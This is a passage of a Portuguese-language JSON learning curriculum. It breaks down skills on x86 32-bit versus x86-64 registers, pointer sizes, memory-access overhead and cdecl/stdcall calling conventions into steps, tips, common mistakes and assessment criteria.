                                "Converter uso de EAX para RAX em código 32->64 bits."
                              ],
                              "assessmentCriteria": [
                                "Precisão na nomenclatura e contagem (16 GPRs exatos).",
                                "Compreensão de extensões de bits e compatibilidade 32/64.",
                                "Capacidade de identificar em contexto de código real.",
                                "Explicação clara de convenções ABI (args/retorno).",
                                "Identificação de erros comuns e correções.",
                                "Aplicação a cenários de segurança (ex: análise de exploits)."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Hierarquia CPU/memória e registradores.",
                                "Programação em C: Convenções de chamada ABI afetam compilação.",
                                "Sistemas Operacionais: RSP em context switches e pilha do kernel.",
                                "Segurança Computacional: Identificação em reverse engineering de binários.",
                                "Algoritmos: Otimização de loops usando mais GPRs em 64 bits."
                              ],
                              "realWorldApplication": "Na análise forense de malware ou exploits, identificar registradores em assembly x86-64 permite mapear fluxo de dados, detectar shellcodes (ex: uso de RAX para payloads) e desenvolver mitigações como ASLR, essencial em cibersegurança."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.1.3",
                            "name": "Comparar tamanhos e usos de registradores",
                            "description": "Comparar os tamanhos (32 vs 64 bits) e usos compatíveis, como acesso a sub-registradores (EAX em RAX), e impactos em performance e código portátil.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar registradores em arquitetura x86 (32 bits)",
                                  "subSteps": [
                                    "Liste os registradores principais de uso geral: EAX, EBX, ECX, EDX.",
                                    "Identifique registradores de 32 bits e seus sub-registradores de 16 e 8 bits (ex: AX, AH, AL em EAX).",
                                    "Descreva usos comuns: EAX para acumulador, ECX para contadores.",
                                    "Examine limitações de endereço: máximo 4GB (2^32).",
                                    "Pratique visualizando em um disassembler como objdump."
                                  ],
                                  "verification": "Crie uma tabela resumindo 8 registradores principais com tamanhos e sub-registradores; confira com documentação oficial Intel.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86",
                                    "Ferramenta objdump ou IDA Free",
                                    "Exemplo de binário 32 bits"
                                  ],
                                  "tips": "Use mnemônicos para memorizar: 'E' para 32 bits extended.",
                                  "learningObjective": "Compreender a estrutura e convenções de registradores em 32 bits.",
                                  "commonMistakes": [
                                    "Confundir sub-registradores (ex: AH não acessível se usando AL), ignorar registradores de segmento."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar registradores em arquitetura x86-64 (64 bits)",
                                  "subSteps": [
                                    "Liste registradores de 64 bits: RAX, RBX, RCX, RDX, etc. (16 no total).",
                                    "Identifique sub-registradores: EAX (32b), AX (16b), AL (8b) dentro de RAX.",
                                    "Descreva novos registradores: R8-R15, e de ponto flutuante XMM/YMM.",
                                    "Note suporte a endereçamento: 64-bit pointers, até 2^64 bytes teóricos.",
                                    "Visualize em debugger como GDB com 'info registers' em binário 64 bits."
                                  ],
                                  "verification": "Desenhe um diagrama hierárquico de RAX mostrando todos sub-registradores; valide com man pages ou Intel manual.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação AMD64",
                                    "GDB debugger",
                                    "Exemplo de binário 64 bits compilado com gcc -m64"
                                  ],
                                  "tips": "Lembre: registradores 64b são prefixados com 'R', 32b com 'E'.",
                                  "learningObjective": "Dominar a expansão de registradores para 64 bits e hierarquia.",
                                  "commonMistakes": [
                                    "Achar que EAX sobrescreve RAX completamente (apenas bits baixos), esquecer R8-R15."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar tamanhos, acessos e compatibilidade",
                                  "subSteps": [
                                    "Compare tamanhos: 32b (E*) vs 64b (R*), impacto em operações aritméticas.",
                                    "Analise acessos: escrever em EAX zera bits altos de RAX (modo default).",
                                    "Teste compatibilidade: compile código 32b em 64b usando sub-registradores.",
                                    "Identifique modos: REX prefix para acessar R8+ ou tamanhos estendidos.",
                                    "Use ferramenta como radare2 para comparar dumps de registradores."
                                  ],
                                  "verification": "Escreva snippet assembly que usa EAX em 64b e verifique em debugger se RAX foi afetado corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Compilador NASM ou gcc com -m32/-m64",
                                    "Debugger GDB ou radare2",
                                    "Intel Optimization Manual"
                                  ],
                                  "tips": "Ative modo 64b com REX.W para full 64b; teste com 'mov eax, 1; mov rax, 2' no GDB.",
                                  "learningObjective": "Comparar precisamente tamanhos e comportamentos de acesso entre arquiteturas.",
                                  "commonMistakes": [
                                    "Ignorar zero-extension em acessos 32b para 64b, confundir com sign-extension."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar impactos em performance e portabilidade",
                                  "subSteps": [
                                    "Discuta performance: 64b mais registros reduzem spills, mas overhead em pointers maiores.",
                                    "Analise portabilidade: código 32b roda em 64b via sub-registradores, mas alinhamentos mudam.",
                                    "Meça: compile benchmarks simples e compare tempos com perf.",
                                    "Considere cenários de segurança: exploits em 32b vs 64b (ASLR, etc.).",
                                    "Crie tabela de prós/contras para migração de código."
                                  ],
                                  "verification": "Rode benchmark comparando loop em 32b vs 64b; documente diferenças observadas.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramenta perf ou time",
                                    "Códigos de teste em C/Assembly",
                                    "Documentação de calling conventions (System V vs Windows)"
                                  ],
                                  "tips": "Use 'gcc -O2' para otimização; foque em cache misses por pointers maiores.",
                                  "learningObjective": "Entender trade-offs práticos para desenvolvimento e análise.",
                                  "commonMistakes": [
                                    "Subestimar overhead de 64b em sistemas legacy, ignorar convenções de chamada."
                                  ]
                                }
                              ],
                              "practicalExample": "Em análise de malware, use GDB para inspecionar um binário 32b rodando em Windows 64b: compare 'info reg eax' vs 'info reg rax' após execução de instrução MOV EAX, 0xDEADBEEF, observando zeroing dos bits altos em RAX, o que previne vazamentos de dados em exploits ROP.",
                              "finalVerifications": [
                                "Liste corretamente todos 16 registradores GPR em x64 com sub-registradores.",
                                "Explique e demonstre zero-extension de EAX para RAX em debugger.",
                                "Identifique pelo menos 3 diferenças chave em usos (ex: contadores, endereços).",
                                "Crie tabela comparativa de tamanhos e impactos em performance.",
                                "Analise um snippet assembly misto 32/64 e preveja comportamento."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de registradores e sub-registradores (90%+ correto).",
                                "Demonstração prática via debugger ou disassembler com screenshots.",
                                "Análise qualitativa/quantitativa de performance (ex: tempos medidos).",
                                "Explicação clara de impactos em portabilidade e segurança.",
                                "Uso correto de terminologia (REX, zero-extension, etc.).",
                                "Criatividade em exemplos reais de aplicação."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Hierarquia de memória e pipeline.",
                                "Programação em C: Convenções de chamada e ponteiros 32/64 bits.",
                                "Segurança da Informação: Reverse engineering e detecção de exploits.",
                                "Otimização de Software: Análise de performance com ferramentas como Valgrind.",
                                "Engenharia de Sistemas: Portabilidade multiplataforma."
                              ],
                              "realWorldApplication": "Em engenharia reversa para cibersegurança, comparar registradores 32/64 permite analisar binários cross-platform, identificar padding em payloads de exploits, otimizar disassemblers como Ghidra, e desenvolver detecção de shellcodes que exploram diferenças de tamanho para bypass de ASLR."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.5.2",
                        "name": "Tamanho de Ponteiros e Acesso a Memória",
                        "description": "Análise das diferenças no tamanho dos ponteiros e implicações no endereçamento de memória entre 32 e 64 bits.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.5.2.1",
                            "name": "Entender ponteiros em 32 bits",
                            "description": "Explicar que ponteiros em x86 32 bits ocupam 4 bytes (32 bits), limitando o espaço de endereço a 4 GB, e exemplos de instruções como MOV [EAX], valor.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Básicos de Ponteiros em Assembly x86 32 bits",
                                  "subSteps": [
                                    "Revise o que é um ponteiro: um registrador ou valor que armazena um endereço de memória.",
                                    "Identifique registradores de 32 bits como EAX, EBX, ECX, EDX que podem atuar como ponteiros.",
                                    "Diferencie endereço (conteúdo do ponteiro) do valor na memória (dereferência).",
                                    "Estude a sintaxe básica: [registrador] para acessar memória indiretamente.",
                                    "Pratique visualizando memória como um array de bytes endereçáveis."
                                  ],
                                  "verification": "Desenhe um diagrama simples mostrando um registrador EAX apontando para um endereço de memória e explique verbalmente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação x86 32 bits (Intel manuals), diagrama de memória em papel ou ferramenta como Draw.io.",
                                  "tips": "Sempre pense em ponteiros como 'setas' apontando para locais na memória.",
                                  "learningObjective": "Definir e visualizar ponteiros em contexto de registradores 32 bits.",
                                  "commonMistakes": "Confundir o valor do ponteiro com o conteúdo da memória apontada."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Tamanho e Limitações dos Ponteiros em 32 bits",
                                  "subSteps": [
                                    "Confirme que ponteiros ocupam 4 bytes (32 bits) em x86 32 bits.",
                                    "Calcule o espaço de endereço máximo: 2^32 = 4 GB (0x00000000 a 0xFFFFFFFF).",
                                    "Discuta limitações: impossibilidade de endereçar mais de 4 GB sem PAE.",
                                    "Compare com modo real (20 bits, 1 MB) para contexto histórico.",
                                    "Identifique que registradores como EAX são truncados para 32 bits."
                                  ],
                                  "verification": "Escreva uma tabela comparando tamanhos de ponteiro em 16, 32 e 64 bits, e calcule 2^32.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Calculadora binária ou Python para potências de 2, cheat sheet de registradores x86.",
                                  "tips": "Lembre-se: bits do ponteiro = log2(espaço endereçável).",
                                  "learningObjective": "Explicar por que ponteiros 32 bits limitam a 4 GB de RAM endereçável.",
                                  "commonMistakes": "Confundir bits do registrador com bytes de endereço (4 bytes = 32 bits)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Instruções de Acesso a Memória via Ponteiros",
                                  "subSteps": [
                                    "Aprenda MOV EAX, endereço: carrega endereço em registrador.",
                                    "Estude MOV [EAX], valor: armazena valor no endereço de EAX.",
                                    "Pratique MOV valor, [EAX]: carrega valor do endereço de EAX para registrador.",
                                    "Analise variações com deslocamentos: MOV [EAX + 4], valor.",
                                    "Teste em emulador: monte um programa simples com essas instruções."
                                  ],
                                  "verification": "Escreva e execute 3 instruções MOV com ponteiros em um emulador como DOSBox ou OllyDbg.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Emulador Assembly (NASM + DOSBox ou x32dbg), editor de texto para .asm.",
                                  "tips": "Use emuladores para ver registradores e memória em tempo real.",
                                  "learningObjective": "Executar e debugar instruções de dereferência de ponteiros.",
                                  "commonMistakes": "Esquecer colchetes [] para dereferência, causando MOV direto no registrador."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar e Verificar Conhecimento com Exemplos Práticos",
                                  "subSteps": [
                                    "Monte um exemplo: EAX = 0x1000; MOV [EAX], 0x1234; MOV EBX, [EAX].",
                                    "Debugue cenários de erro: ponteiro inválido (null ou fora de 4GB).",
                                    "Compare com 64 bits: ponteiros de 8 bytes vs. 4 bytes.",
                                    "Discuta implicações em segurança: overflows em buffers 32 bits.",
                                    "Resuma diferenças chave em um fluxograma."
                                  ],
                                  "verification": "Crie um snippet assembly funcional que use ponteiro para swap de valores e explique o dump de memória.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Emulador/debugger, exemplos de código assembly prontos para modificação.",
                                  "tips": "Sempre inicialize ponteiros para evitar crashes por dereferência nula.",
                                  "learningObjective": "Integrar conceitos em código executável e identificar erros.",
                                  "commonMistakes": "Ignorar alinhamento de memória, causando faults de segmentação."
                                }
                              ],
                              "practicalExample": "Em um programa assembly 32 bits: MOV EAX, 0x00401000 (endereço válido); MOV DWORD PTR [EAX], 0xDEADBEEF; MOV EBX, [EAX]; // EBX agora contém 0xDEADBEEF. Isso demonstra armazenamento e leitura via ponteiro limitado a 4GB.",
                              "finalVerifications": [
                                "Explicar corretamente que ponteiros 32 bits usam 4 bytes.",
                                "Calcular e justificar limite de 4 GB de endereço.",
                                "Escrever instrução MOV [EAX], 42 sem erros de sintaxe.",
                                "Debugar um exemplo simples em emulador.",
                                "Diferenciar ponteiro 32 bits de 64 bits.",
                                "Identificar risco de overflow em contexto de segurança."
                              ],
                              "assessmentCriteria": [
                                "Precisão na explicação do tamanho do ponteiro (4 bytes/32 bits).",
                                "Correção nos exemplos de instruções assembly.",
                                "Compreensão das limitações de endereçamento (4 GB).",
                                "Capacidade de debugar código com ponteiros.",
                                "Integração com conceitos de segurança computacional.",
                                "Clareza em diagramas ou fluxogramas explicativos."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem C: Ponteiros em C compilados para assembly 32 bits.",
                                "Sistemas Operacionais: Gerenciamento de memória virtual em 32 bits (PAE).",
                                "Segurança da Informação: Exploração de buffer overflows via ponteiros inválidos.",
                                "Arquitetura de Computadores: Registradores e barramento de endereços."
                              ],
                              "realWorldApplication": "Em reverse engineering de binários 32 bits (malware legacy ou apps Windows XP), entender ponteiros permite analisar acessos de memória para detectar exploits como ROP chains limitados a 4 GB."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.2.2",
                            "name": "Entender ponteiros em 64 bits",
                            "description": "Descrever ponteiros em x86-64 ocupando 8 bytes (64 bits), com espaço de endereço teórico de 16 exabytes, e mudanças em instruções de carga/armazenamento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o tamanho dos ponteiros em x86-64",
                                  "subSteps": [
                                    "Revise a arquitetura x86-64 e confirme que registradores de endereço geral são de 64 bits.",
                                    "Explique que ponteiros, sendo endereços de memória, ocupam 8 bytes (64 bits) em sistemas 64 bits.",
                                    "Compare com x86-32, onde ponteiros ocupam 4 bytes.",
                                    "Identifique convenções de chamada como System V ABI para x86-64.",
                                    "Compile um programa C simples e verifique o tamanho com sizeof(void*) em 64 bits."
                                  ],
                                  "verification": "Execute 'sizeof(void*)' em um programa C compilado para x86-64 e confirme saída 8.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Compilador GCC para x86-64",
                                    "Editor de texto",
                                    "Terminal Linux/macOS"
                                  ],
                                  "tips": "Use 'gcc -m64' explicitamente para garantir modo 64 bits.",
                                  "learningObjective": "Explicar por que ponteiros em x86-64 são 8 bytes e diferenciar de 32 bits.",
                                  "commonMistakes": [
                                    "Confundir tamanho de ponteiro com tamanho de registrador de dados.",
                                    "Assumir compatibilidade direta com código 32 bits."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Calcular o espaço de endereço teórico",
                                  "subSteps": [
                                    "Calcule 2^64 = 18.446.744.073.709.551.616 bytes ≈ 16 exabytes.",
                                    "Discuta que o espaço virtual é dividido em user space (0x0000_0000_0000_0000 a 0x0000_7FFF_FFFF_FFFF) e kernel space.",
                                    "Explique canonical addressing: bits 48-63 devem espelhar bit 47 para endereços válidos.",
                                    "Verifique limites reais em SOs modernos (ex: 128 TB user space no Linux x86-64).",
                                    "Use ferramentas como 'cat /proc/cpuinfo' para confirmar suporte a 64 bits."
                                  ],
                                  "verification": "Responda corretamente: quantos bytes em 2^64? E descreva canonical form.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação Intel x86-64 manuals (Vol. 1)",
                                    "Comando 'cat /proc/cpuinfo' no Linux"
                                  ],
                                  "tips": "Lembre-se: espaço teórico vs. implementado; foque em 48 bits efetivos na prática.",
                                  "learningObjective": "Calcular e contextualizar o vasto espaço de endereço de 16 EB em x86-64.",
                                  "commonMistakes": [
                                    "Confundir 2^64 bytes com gigabytes incorretos.",
                                    "Ignorar sign extension em endereços canônicos."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar mudanças em instruções de carga e armazenamento",
                                  "subSteps": [
                                    "Estude instruções MOV: em 64 bits, usa REX prefix para registradores >8 e modos de endereço.",
                                    "Compare LEA (Load Effective Address) que agora suporta RIP-relative addressing.",
                                    "Examine load/store: MOVQ para quadword (64 bits), com prefixes para tamanho.",
                                    "Desmonte código assembly simples com objdump ou GDB para ver diferenças.",
                                    "Pratique com exemplo: mov rax, [rdi] vs. 32 bits mov eax, [edi]."
                                  ],
                                  "verification": "Desmonte um binário 64 bits e identifique uso de REX prefix em load/store.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB debugger",
                                    "objdump tool",
                                    "Exemplo de código C com ponteiros"
                                  ],
                                  "tips": "Use 'gdb -q programa' e 'disassemble main' para inspecionar.",
                                  "learningObjective": "Identificar e explicar alterações em instruções de memória em x86-64.",
                                  "commonMistakes": [
                                    "Esquecer REX.W para operações 64 bits.",
                                    "Misturar sintaxe AT&T vs. Intel."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar conceitos com exemplos práticos",
                                  "subSteps": [
                                    "Escreva um programa C usando ponteiros e compile para x86-64.",
                                    "Inspecione assembly gerado com 'objdump -d' e note ponteiros de 8 bytes.",
                                    "Simule um buffer overflow considerando ponteiros maiores.",
                                    "Compare dumps de 32 e 64 bits para visualizar diferenças.",
                                    "Documente observações em um relatório curto."
                                  ],
                                  "verification": "Gere e compare dumps assembly de versões 32 e 64 bits de um programa.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "GCC com opções -m32 e -m64",
                                    "objdump",
                                    "Hex editor opcional"
                                  ],
                                  "tips": "Use 'gcc -S -m64 file.c' para gerar .s assembly legível.",
                                  "learningObjective": "Aplicar conhecimento de ponteiros 64 bits em análise de binários reais.",
                                  "commonMistakes": [
                                    "Compilar sem especificar arquitetura.",
                                    "Ignorar alinhamento de memória em 64 bits."
                                  ]
                                }
                              ],
                              "practicalExample": "Compile este C: int main() { int x=42; int* p = &x; printf('%p\\n', (void*)p); } com gcc -m64. No GDB, examine 'x/8bx $rsp' para ver ponteiro de 8 bytes no stack, e 'disass main' para instruções MOV com REX prefix carregando o endereço de 64 bits.",
                              "finalVerifications": [
                                "Explicar corretamente que ponteiros x86-64 são 8 bytes e por quê.",
                                "Calcular 2^64 e citar 16 exabytes.",
                                "Identificar REX prefix em uma instrução de load 64 bits.",
                                "Descrever canonical addressing e seus limites práticos.",
                                "Comparar acesso a memória 32 vs 64 bits em um exemplo assembly.",
                                "Simular impacto em exploits de segurança devido a ponteiros maiores."
                              ],
                              "assessmentCriteria": [
                                "Precisão no tamanho e cálculo de espaço de endereço (100% correto).",
                                "Correta identificação de mudanças em instruções (ex: REX, MOVQ).",
                                "Qualidade da análise de exemplo prático com dumps assembly.",
                                "Compreensão de implicações em segurança computacional.",
                                "Capacidade de evitar erros comuns como confusão de arquiteturas.",
                                "Relatório claro integrando todos os conceitos."
                              ],
                              "crossCurricularConnections": [
                                "Segurança Computacional: Impacto em buffer overflows e ROP chains com ASLR 64 bits.",
                                "Sistemas Operacionais: Gerenciamento de espaço virtual em Linux/Windows x86-64.",
                                "Programação em C: Uso de ponteiros canônicos e alinhamento.",
                                "Arquitetura de Computadores: Evolução de registradores e modos de endereçamento."
                              ],
                              "realWorldApplication": "Em análise de malware e reverse engineering, entender ponteiros 64 bits é essencial para desmontar binários modernos de servidores e exploits em sistemas como Linux x86-64, onde endereços de 16 EB permitem ASLR efetivo, dificultando ataques baseados em endereços fixos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.2.3",
                            "name": "Analisar impactos no acesso a memória",
                            "description": "Discutir impactos como maior overhead em cópias de ponteiros e necessidade de alinhamento em 64 bits, com exemplos de código assembly comparativo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender diferenças de tamanho de ponteiros entre 32 e 64 bits",
                                  "subSteps": [
                                    "Revise o tamanho dos registradores e ponteiros em x86 (32 bits): ponteiros de 4 bytes.",
                                    "Compare com x86-64 (64 bits): ponteiros de 8 bytes, impactando o uso de memória.",
                                    "Identifique como isso afeta estruturas de dados como stacks e heaps.",
                                    "Estude o calling convention: parâmetros passados via stack em 32 bits vs registradores em 64 bits.",
                                    "Anote exemplos de registradores: EAX (32b) vs RAX (64b)."
                                  ],
                                  "verification": "Liste corretamente os tamanhos de ponteiros e 3 impactos iniciais em um documento.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação Intel x86/x86-64 manuals, diagramas de memória.",
                                  "tips": "Use diagramas visuais para comparar tamanhos de memória.",
                                  "learningObjective": "Diferenciar tamanhos de ponteiros e suas implicações iniciais em acesso à memória.",
                                  "commonMistakes": "Confundir ponteiros com registradores gerais; ignorar System V ABI para 64 bits."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar overhead em cópias de ponteiros",
                                  "subSteps": [
                                    "Calcule overhead: cópia de ponteiro 32b = 4 bytes vs 64b = 8 bytes (dobro de tráfego de memória).",
                                    "Simule em código: mov eax, [ptr] (32b) vs mov rax, [ptr] (64b).",
                                    "Meça impacto em loops: mais ciclos de CPU para cópias maiores.",
                                    "Compare bandwidth de memória: 64 bits consome mais cache lines.",
                                    "Teste com ferramentas como perf para medir stalls de memória."
                                  ],
                                  "verification": "Gere um relatório com cálculos de overhead e simulação de 2 cenários.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Compilador NASM/GAS, debugger GDB, ferramenta perf (Linux).",
                                  "tips": "Compile códigos mínimos e use 'perf stat' para métricas reais.",
                                  "learningObjective": "Quantificar e exemplificar overhead causado por ponteiros maiores.",
                                  "commonMistakes": "Subestimar impacto em cache; não considerar alinhamento durante cópias."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar necessidade de alinhamento em 64 bits",
                                  "subSteps": [
                                    "Defina alinhamento: acessos de 8 bytes devem ser em endereços múltiplos de 8.",
                                    "Estude penalidades: unaligned access causa splits de cache line ou faults.",
                                    "Exemplo: mov rax, [unaligned_ptr] gera múltiplas instruções em 64b.",
                                    "Compare com 32b: menos restritivo, mas ainda penalizado.",
                                    "Implemente padding em structs para alinhamento manual."
                                  ],
                                  "verification": "Crie e teste código assembly com alinhamento vs desalinhado, medindo performance.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Editor de assembly (VS Code + NASM), emulador QEMU para testes isolados.",
                                  "tips": "Use 'objdump -d' para inspecionar código gerado e verificar instruções extras.",
                                  "learningObjective": "Identificar e mitigar problemas de alinhamento em acessos de 64 bits.",
                                  "commonMistakes": "Ignorar flags de CPU como AVX que amplificam penalidades; confundir com packing."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar exemplos de código assembly 32 vs 64 bits",
                                  "subSteps": [
                                    "Escreva função simples: cópia de array via ponteiros em 32b.",
                                    "Porte para 64b e compare assembly gerado com objdump.",
                                    "Analise diferenças: mais MOV de 8 bytes, registradores extras.",
                                    "Discuta segurança: ponteiros maiores reduzem ASLR effectiveness? Não, mas aumentam superfície.",
                                    "Sintetize discussão: overhead total em cenários reais como buffers."
                                  ],
                                  "verification": "Produza side-by-side comparison de códigos com métricas de performance.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "NASM, ld linker, scripts de teste em C/assembly híbrido.",
                                  "tips": "Use GitHub gists para versionar códigos 32/64b e diffs.",
                                  "learningObjective": "Integrar análises em comparação prática de códigos assembly.",
                                  "commonMistakes": "Não normalizar testes (mesmo hardware); focar só em teoria sem benchmarks."
                                }
                              ],
                              "practicalExample": "Código 32b: mov eax, [esp+4]; mov [ebx], eax (cópia rápida 4B). 64b: mov rax, [rsp+8]; mov [rbx], rax (8B, mais cache miss se desalinhado). Teste: loop de 1M cópias mostra 64b ~1.8x mais lento em perf.",
                              "finalVerifications": [
                                "Explicar verbalmente overhead de ponteiros com números exatos.",
                                "Demonstrar código desalinhado falhando ou lento em GDB.",
                                "Comparar dumps de assembly de 32/64b identificando 3 diferenças chave.",
                                "Calcular impacto em struct de 10 ponteiros: +40 bytes memória.",
                                "Identificar alinhamento em código real de exploit (ex: ROP chain).",
                                "Benchmark próprio mostra >20% overhead em cópias intensivas."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos tamanhos e cálculos de overhead (90% correto).",
                                "Uso correto de ferramentas para verificação empírica.",
                                "Análise qualitativa/quantitativa equilibrada com exemplos.",
                                "Identificação de pelo menos 2 erros comuns e mitigações.",
                                "Conexão clara com segurança (ex: análise binária em RE).",
                                "Relatório estruturado com evidências (códigos, outputs)."
                              ],
                              "crossCurricularConnections": [
                                "Otimização de Performance: Técnicas de cache e vetorização.",
                                "Engenharia de Software: Portabilidade 32/64b em C/Rust.",
                                "Segurança: Exploração de memória em binários (buffer overflows).",
                                "Arquitetura de Computadores: Modelos de memória hierárquica.",
                                "Análise Reversing: Disassembly em IDA/Ghidra."
                              ],
                              "realWorldApplication": "Em análise de malware, entender overhead 64b ajuda a detectar binários portados ineficientemente; em pentests, alinhamento afeta ROP gadgets; otimização de kernels reduz stalls em cloud computing."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.5.3",
                        "name": "Convenções de Chamada de Funções",
                        "description": "Diferenças nas convenções de chamada (calling conventions) entre x86 32 bits (cdecl, stdcall) e x86-64 (System V AMD64 ou Microsoft x64).",
                        "specificSkills": [
                          {
                            "id": "10.1.2.5.3.1",
                            "name": "Descrever convenções em 32 bits",
                            "description": "Explicar convenções como cdecl (parâmetros na pilha, caller limpa) e stdcall (callee limpa), com exemplos de CALL, PUSH e RET.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Conceitos Básicos de Convenções de Chamada em 32 bits",
                                  "subSteps": [
                                    "Estude o papel das convenções de chamada: padronizar passagem de parâmetros, retorno de valores e limpeza da pilha em Assembly x86 32 bits.",
                                    "Identifique componentes chave: registradores (EAX para retorno), pilha (ESP/EBP) e instruções como PUSH, CALL e RET.",
                                    "Revise arquitetura de pilha: growing down, alinhamento e frames de pilha.",
                                    "Associe convenções a ABIs (Application Binary Interfaces) em Windows/Linux.",
                                    "Anote diferenças iniciais entre caller e callee responsibilities."
                                  ],
                                  "verification": "Crie um diagrama da pilha antes/depois de uma chamada genérica e explique responsabilidades.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação Intel x86 manuals (Vol. 1), diagramas de pilha online, editor de texto para anotações.",
                                  "tips": "Use ferramentas como GDB para observar ESP em runtime durante chamadas simples.",
                                  "learningObjective": "Compreender o propósito e componentes fundamentais das convenções de chamada em 32 bits.",
                                  "commonMistakes": "Confundir pilha com registradores para passagem de parâmetros; ignorar alinhamento de 4 bytes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar a Convenção CDECL",
                                  "subSteps": [
                                    "Descreva cdecl: parâmetros empilhados da direita para esquerda pelo caller; caller limpa a pilha após RET.",
                                    "Analise sequência: PUSH params -> CALL func -> ADD ESP, N (limpeza pelo caller).",
                                    "Estude convenções de registradores: EAX=retorno, ECX/EDX params rápidos (variadic).",
                                    "Examine exemplos em C compilado para Assembly (gcc -S).",
                                    "Pratique montando um exemplo manual: func(int a, int b) { return a+b; }."
                                  ],
                                  "verification": "Escreva Assembly equivalente a uma função C simples em cdecl e simule execução passo a passo.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Compilador GCC, NASM, debugger GDB ou OllyDbg, exemplos de código C/Assembly.",
                                  "tips": "Compile com -m32 para forçar 32 bits; use 'objdump -d' para disassemblar.",
                                  "learningObjective": "Explicar precisamente o fluxo de cdecl, incluindo limpeza da pilha pelo caller.",
                                  "commonMistakes": "Esquecer ordem right-to-left; assumir callee limpa como em stdcall."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dominar a Convenção STDCALL",
                                  "subSteps": [
                                    "Descreva stdcall: parâmetros right-to-left pelo caller; callee limpa via RET N.",
                                    "Compare com cdecl: mesma empilhada, mas RET 0x8 limpa 8 bytes (fixo).",
                                    "Analise uso em Windows API: padronizado para DLLs.",
                                    "Estude limitações: número fixo de params (nome mangling como _func@16).",
                                    "Construa exemplo: Windows MessageBoxA equivalente em stdcall."
                                  ],
                                  "verification": "Converta um exemplo cdecl para stdcall, ajustando RET e teste em emulador.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Compilador MinGW (stdcall), Win32 API docs, emulator como DOSBox ou Bochs.",
                                  "tips": "Verifique mangling com 'dumpbin /symbols' em .obj files.",
                                  "learningObjective": "Diferenciar stdcall de cdecl focando na limpeza pela callee.",
                                  "commonMistakes": "Usar RET sem bytes de limpeza; ignorar mangling em nomes de funções."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar Convenções e Praticar com Exemplos",
                                  "subSteps": [
                                    "Crie tabela comparativa: caller/callee cleanup, ordem params, registradores, uso típico.",
                                    "Desmonte binários reais: compare chamadas em apps Windows/Linux.",
                                    "Simule exploits: stack overflow em cdecl vs stdcall.",
                                    "Escreva função híbrida e teste interoperabilidade.",
                                    "Documente diferenças em 64 bits (para contexto futuro)."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito as diferenças com um exemplo CALL/PUSH/RET para cada.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Binários sample (hello world 32-bit), IDA Free ou Ghidra para análise.",
                                  "tips": "Use 'strace' ou ProcMon para observar chamadas reais em runtime.",
                                  "learningObjective": "Aplicar e comparar cdecl/stdcall em cenários práticos de análise.",
